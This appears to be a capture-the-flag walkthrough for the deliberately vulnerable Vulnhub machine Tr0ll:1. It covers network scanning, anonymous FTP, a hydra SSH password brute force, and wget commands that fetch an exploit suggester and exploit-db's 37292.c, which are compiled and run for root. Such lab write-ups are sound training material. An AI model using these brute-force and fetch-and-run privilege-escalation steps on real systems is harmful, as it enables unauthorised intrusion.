## **TR0LL:1**



*Vulnhub link for download:*

*Tr0ll-1 = https://www.vulnhub.com/entry/tr0ll-1,100/*

###### 



###### **===========STEP ONE===========**

**--------Analysis and collection--------**

**=======================================**

To find out the IP address of the machine,

I used the command: **sudo netdiscover -r 192.168.0.0/24** (*replace this with your LAN*)

Look for the line like **«PCS Systemtechnik GmbH»**, it will be "Tr0ll 1".



Next, I will use nmap/zenmap to find open ports and running services.

Default Command will suffice: **nmap -T4 -A -v <IP>**



We will get the following result (*Only important info*):



PORT   STATE SERVICE VERSION

21/tcp **open**  ftp     vsftpd 3.0.2

| ftp-anon: Anonymous FTP login allowed (FTP code 230)

|\_-rwxrwxrwx    1 1000     0            8068 Aug 09  2014 lol.pcap \[NSE: writeable]

22/tcp **open**  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)

80/tcp **open**  http    Apache httpd 2.4.7 ((Ubuntu))

| http-robots.txt: 1 disallowed entry

|\_/secret



I see that you can connect to FTP via “Anonymous”, and directory have file lol.pcap,

try this one!

Use commands:

ftp <IP>

login: Anonymous

password: “Just press Enter”

ls 		\*will see lol.pcap\*

get lol.pcap 	*!May not load on the first attempt!*



Okay, go to web-site - <IP>:80, see the troll image:)

Open secret directory from nmap scan (/robots.txt and /secret)

*!You also can use utils like: **dirb, nikto, gobuster**!*

But see again Troll face!



Go open file lol.pcap with Wireshark!

See the Traffic, okay lets analyze.

I found raw #40 interesting, protocol=FTP data and have ~150Bytes data.
Opened this i saw string “Well, well, well, aren't you just a clever little devil, you almost found the sup3rs3cr3tdirlol:-P\\n\\nSucks, you were so close... gotta TRY Harder:)”

The sup3rs3cr3tdirlol have ‘dir’ in name, go open next one with <IP>/sup3rs3cr3tdirlol

Nice, see file “roflmao”, download and open with text editor ‘nano’

Found raw “Find address 0x0856BF to proceed”
Again go to web-site and search <IP>/0x0856BF:

See 2 dirs, “good\_luck/”; “this\_folder\_contains\_the\_password/”

“good\_luck/” have file “which\_one\_lol.txt”

“this\_folder\_contains\_the\_password/” have file Pass.txt

Download both.



First step is done!





###### **===========STEP TWO===========**

**----------------Hacking----------------**

**=======================================**

We have the login:password, go use hydra for brute force ssh ->

command: 

hydra -L which\_one\_lol.txt -p Pass.txt ssh://<IP>

*note !Pass.txt it is string, not file!)*



Found credential:

login = overflow
password = Pass.txt



Connect to ssh with this credential.

We got a terrible shell, let's upgrade it, just use command: “bash”



Go hack this.



Download Util for search CVE with:
wget https://raw.githubusercontent.com/The-Z-Labs/linux-exploit-suggester/refs/heads/master/linux-exploit-suggester.sh -O les.sh

Give permissions : chmod +x les.sh

Run it -> ./les.sh



We'll see a list CVE, From the list of vulnerabilities found, I selected https://www.exploit-db.com/download/37292.c 

Install it with wget and compile:

wget https://www.exploit-db.com/download/37292.c

gcc 37292.c -o exploit

./exploit



**Tr0ll:1 is Well DONE!**

**#We are ROOT!**



